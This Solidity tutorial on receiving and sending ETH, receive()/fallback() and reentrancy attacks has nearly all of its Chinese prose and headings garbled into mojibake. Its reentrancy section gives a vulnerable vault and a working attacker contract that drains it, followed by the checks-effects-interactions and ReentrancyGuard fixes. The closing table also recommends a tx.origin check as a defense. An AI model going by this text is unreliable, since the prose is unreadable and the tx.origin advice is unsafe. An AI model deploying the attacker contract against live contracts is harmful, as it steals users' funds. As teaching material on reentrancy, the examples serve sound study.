
### ğŸ§¾ 1. åˆçº¦æ”¶æ¬¾æ–¹å¼

#### payableä¿®é¥°ç¬¦

```solidity
function funcName() public payable() {

}
```

### ğŸ”¹ `receive()` å‡½æ•°

#### âœ… ç”¨é€”

å½“åˆçº¦æ”¶åˆ°**çº¯ ETH è½¬è´¦**ï¼ˆä¾‹å¦‚ `address(this).transfer()` æˆ– `address(this).send()`ï¼‰ä¸”**æ²¡æœ‰è°ƒç”¨æ•°æ®**ï¼ˆdataä¸ºç©ºï¼‰æ—¶ï¼Œä¼šè°ƒç”¨ `receive()` å‡½æ•°ã€‚

#### âœ… **è¯­æ³•**

```solidity
receive() external payable {     // æ”¶æ¬¾é€»è¾‘ }
```


- `external`ï¼šåªèƒ½è¢«å¤–éƒ¨è°ƒç”¨ã€‚
    
- `payable`ï¼šå…è®¸æ¥æ”¶ ETHã€‚
    
- ä¸èƒ½æœ‰å‚æ•°ï¼Œä¹Ÿä¸èƒ½è¿”å›å€¼ã€‚
    
- æ¯ä¸ªåˆçº¦**åªèƒ½æœ‰ä¸€ä¸ª `receive()` å‡½æ•°**ã€‚
    

### âœ… ä½¿ç”¨åœºæ™¯

```solidity
contract MyContract {
    event Received(address sender, uint amount);

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
}


```


---

### ğŸ”¹ `fallback()` å‡½æ•°

#### âœ… ç”¨é€”

- å½“è°ƒç”¨åˆçº¦å‡½æ•°æ—¶ï¼Œ**æ‰¾ä¸åˆ°å¯¹åº”å‡½æ•°ç­¾å**
    
- æˆ–è€…è°ƒç”¨æ—¶å¸¦æœ‰æ•°æ®ï¼Œä½†åˆçº¦ä¸­æ²¡æœ‰ `receive()` å‡½æ•°å¯è°ƒç”¨
    

ä¼šè§¦å‘ `fallback()` å‡½æ•°ã€‚

#### âœ… è¯­æ³•ï¼ˆä¸¤ç§ï¼‰

##### 1. å…è®¸æ”¶æ¬¾ï¼š

```solidity
fallback() external payable {     // fallback æ”¶æ¬¾é€»è¾‘ }
```


##### 2. ä¸æ”¶æ¬¾ï¼Œä»…å“åº”é”™è¯¯è°ƒç”¨ï¼š

```solidity
fallback() external {     // fallback é payableï¼Œä¸èƒ½æ¥æ”¶ ETH }
```
``

#### âœ… ä½¿ç”¨åœºæ™¯

```solidity
contract MyContract {
    event FallbackCalled(address sender, uint amount, bytes data);

    fallback() external payable {
        emit FallbackCalled(msg.sender, msg.value, msg.data);
    }
}

```


---

### ğŸ“Š `receive` vs `fallback` å¯¹æ¯”æ€»ç»“

| ç‰¹æ€§        | `receive()`      | `fallback()`      |
| --------- | ---------------- | ----------------- |
| æ˜¯å¦èƒ½æ¥æ”¶ ETH | æ˜¯ï¼ˆå¿…é¡»æ˜¯ `payable`ï¼‰ | å¯é€‰ï¼ˆ`payable` æˆ–ä¸å†™ï¼‰ |
| æ˜¯å¦æ¥æ”¶ data | å¦ï¼ˆdata å¿…é¡»ä¸ºç©ºï¼‰     | æ˜¯ï¼ˆdata éç©ºæˆ–æ— å‡½æ•°åŒ¹é…ï¼‰  |
| æ˜¯å¦å¿…é¡»å­˜åœ¨    | å¦ï¼ˆå¯é€‰ï¼‰            | å¦ï¼ˆå¯é€‰ï¼‰             |
| å¸¸è§è§¦å‘æ¡ä»¶    | çº¯ ETH è½¬è´¦ï¼Œæ— æ•°æ®     | é”™è¯¯è°ƒç”¨æˆ–å¸¦ data è½¬è´¦    |

---

### ğŸ§  å®æˆ˜å»ºè®®

- å¦‚æœä½ åªæ˜¯æƒ³æ¥æ”¶çº¯ ETHï¼Œå¯ä»¥åªå†™ `receive() payable`ã€‚
    
- å¦‚æœä½ æƒ³å¯¹ä»»ä½•æœªçŸ¥è°ƒç”¨åšå¤„ç†ï¼ˆæ¯”å¦‚ proxyã€æ—¥å¿—è®°å½•ï¼‰ï¼Œå°±ç”¨ `fallback()`ã€‚
    
- å¦‚æœä¸¤è€…éƒ½å†™äº†ï¼ŒSolidity ä¼šä¼˜å…ˆè°ƒç”¨ `receive()`ï¼Œåªåœ¨ `data` ä¸ä¸ºç©ºæ—¶æ‰ä¼šè°ƒç”¨ `fallback()`ã€‚
---

### ğŸ“¥ 2. æŸ¥çœ‹åˆçº¦æ”¶åˆ°çš„ä½™é¢

```solidity
address(this).balance
```

- è¿”å›å½“å‰åˆçº¦åœ°å€çš„ ETH ä½™é¢ï¼ˆå•ä½ä¸º weiï¼‰
    

---

### ğŸ’¸ 3. åˆçº¦å‘å¤–è½¬è´¦çš„ä¸‰ç§æ–¹å¼
> è½¬ç»™ å¤–éƒ¨è´¦æˆ·ã€åˆçº¦è´¦æˆ·

#### âœ… address.transfer

```solidity
payable(msg.sender).transfer(1 ether);
```

- å›ºå®š 2300 gasï¼Œå¤±è´¥è‡ªåŠ¨ revert
    

#### âœ… address.send

```solidity
bool success = payable(msg.sender).send(1 ether);
require(success, "Send failed");
```

- åŒæ ·åªæä¾› 2300 gasï¼Œä½†éœ€è¦æ‰‹åŠ¨æ£€æŸ¥è¿”å›å€¼
    

#### âœ… callï¼ˆæ¨èï¼‰

```solidity
(bool success, ) = payable(msg.sender).call{value: 1 ether}("");
require(success, "Call failed");
```

- å¯è°ƒ gasï¼Œå…¼å®¹æ–°ç‰ˆæœ¬ï¼Œå®˜æ–¹æ¨èæ–¹å¼
    

---

### ğŸ›¡ï¸ 4. å®‰å…¨å»ºè®®

- ä½¿ç”¨ `call` æ›¿ä»£ `transfer` / `send`ï¼Œé¿å… `Out of Gas` é”™è¯¯
    
- ä½¿ç”¨ `ReentrancyGuard` é˜²æ­¢é‡å…¥æ”»å‡»
    
- é¿å…åœ¨ `receive()` ä¸­æ‰§è¡Œå¤æ‚é€»è¾‘
    

---

### ğŸ” 5. ç¤ºä¾‹ï¼šæ”¶æ¬¾å’Œææ¬¾åˆçº¦

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
```

---

## âš ï¸ 6. é‡å…¥æ”»å‡»ï¼ˆReentrancy Attackï¼‰

### ğŸ ä»€ä¹ˆæ˜¯é‡å…¥æ”»å‡»ï¼Ÿ

å½“åˆçº¦è°ƒç”¨å¤–éƒ¨åœ°å€ï¼ˆå¦‚ `call` è½¬è´¦ï¼‰æ—¶ï¼Œå¦‚æœè¯¥åœ°å€æ˜¯ä¸€ä¸ªåˆçº¦ï¼Œå®ƒå¯ä»¥åœ¨æœªå®Œæˆå‰ä¸€æ¬¡è°ƒç”¨å‰ï¼Œ**åå¤è°ƒç”¨å›åŸåˆçº¦çš„å‡½æ•°**ï¼Œé€ æˆé‡å¤æç°ç­‰å®‰å…¨é—®é¢˜ã€‚
### ğŸ¬ æ”»å‡»æ¼”ç¤ºï¼šæ˜“å—æ”»å‡»çš„åˆçº¦

```solidity
// VulnerableVault.sol
contract VulnerableVault {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balances[msg.sender] > 0, "No balance");

        // å‘é€ ETHï¼ˆå¤–éƒ¨è°ƒç”¨ï¼Œå®¹æ˜“è¢«æ”»å‡»è€…é‡å…¥ï¼‰
        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Transfer failed");

        // æ›´æ–°ä½™é¢ï¼ˆæ”¾åœ¨è°ƒç”¨åï¼Œå¯¼è‡´æ¼æ´ï¼‰
        balances[msg.sender] = 0;
    }
}

```


---

### ğŸ§¨ æ”»å‡»è€…åˆçº¦

```solidity
// Attacker.sol
contract Attacker {
    VulnerableVault public target;

    constructor(address _target) {
        target = VulnerableVault(_target);
    }

    // å›è°ƒå‡½æ•°ï¼Œè¶æœºå†æ¬¡æå–
    receive() external payable {
        if (address(target).balance > 1 ether) {
            target.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }
}

```

#### æµç¨‹è¯´æ˜
- ğŸ‘¤ ç”¨æˆ·å‘ VulnerableVault åˆçº¦ `deposit()` å­˜å…¥ 1 ETH
    
- ğŸ§‘â€ğŸ’» æ”»å‡»è€…è°ƒç”¨ `withdraw()`ï¼Œè§¦å‘åˆçº¦è½¬è´¦ `call`
    
- ğŸ§  æ”»å‡»è€…åˆçº¦åœ¨ `receive()` ä¸­å†æ¬¡è°ƒç”¨ `withdraw()`
    
- ğŸ” å› ä¸ºåˆçº¦å°šæœªæ›´æ–° `balances`ï¼Œæ”»å‡»è€…å¯å¤šæ¬¡æå–
    
- ğŸ´ åˆçº¦ä½™é¢è¢«æç©ºï¼Œæ”»å‡»æˆåŠŸ

---

### ğŸ›¡ï¸ å¦‚ä½•é˜²æ­¢é‡å…¥æ”»å‡»ï¼Ÿ

#### âœ… ä½¿ç”¨â€œ**æ£€æŸ¥-æ•ˆæœ-äº¤äº’**â€æ¨¡å¼ï¼š
```solidity
function withdraw() external {
    uint amount = balances[msg.sender];
    require(amount > 0, "No balance");

    // å…ˆæ›´æ–°çŠ¶æ€
    balances[msg.sender] = 0;

    // å†è½¬è´¦ï¼ˆå¤–éƒ¨è°ƒç”¨ï¼‰
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}

```


#### âœ… ä½¿ç”¨ `ReentrancyGuard`ï¼ˆOpenZeppelin æä¾›ï¼‰

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureVault is ReentrancyGuard {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint amount = balances[msg.sender];
        require(amount > 0, "No balance");
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}

```



---

### ğŸ¯ å°ç»“

|é˜²å¾¡æªæ–½|è¯´æ˜|
|---|---|
|çŠ¶æ€æ›´æ–°åœ¨å‰|é˜²æ­¢å¤šæ¬¡è°ƒç”¨åˆ©ç”¨æ—§çŠ¶æ€|
|ä½¿ç”¨ `ReentrancyGuard`|ç®€æ´é˜²å¾¡ï¼Œé€‚åˆå¤§å¤šæ•°åœºæ™¯|
|é™åˆ¶å¤–éƒ¨åˆçº¦è°ƒç”¨|æ£€æŸ¥ `tx.origin` æˆ–è®¾ç™½åå•|

---